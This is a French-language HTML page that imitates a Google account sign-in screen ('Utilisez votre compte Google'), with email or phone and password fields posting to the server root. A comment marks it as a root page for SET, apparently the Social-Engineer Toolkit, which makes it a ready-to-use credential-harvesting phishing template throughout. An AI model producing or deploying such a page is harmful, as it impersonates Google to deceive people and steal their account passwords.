<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Connexion</title>
  <!-- Page racine pour SET : tout en inline, aucun JS -->
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      background: #202124;
      color: #f1f3f4;
      font-family: Arial, Helvetica, sans-serif;
    }
    .card {
      width: min(420px, calc(100% - 32px));
      padding: 36px;
      border-radius: 28px;
      background: #0f0f10;
      box-shadow: 0 28px 70px rgba(0, 0, 0, 0.28);
    }
    h1 { margin: 0 0 8px; font-size: 2rem; font-weight: 500; }
    p { margin: 0 0 24px; color: #bdc1c6; }
    label {
      display: block;
      margin-bottom: 6px;
      color: #8ab4f8;
      font-size: 0.85rem;
    }
    input {
      width: 100%;
      height: 52px;
      margin-bottom: 18px;
      border: 1px solid #5f6368;
      border-radius: 2px;
      background: transparent;
      color: #f1f3f4;
      padding: 0 14px;
    }
    button {
      float: right;
      border: 0;
      border-radius: 999px;
      background: #a8c7fa;
      color: #062e6f;
      cursor: pointer;
      font-weight: 700;
      padding: 11px 22px;
    }
    .clear { clear: both; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Connexion</h1>
    <p>Utilisez votre compte Google</p>

    <form method="post" action="/">
      <label for="username">Adresse e-mail ou téléphone</label>
      <input id="username" name="username" type="text" required />

      <label for="password">Mot de passe</label>
      <input id="password" name="password" type="password" required />

      <button type="submit">Suivant</button>
      <div class="clear"></div>
    </form>
  </div>
</body>
</html>
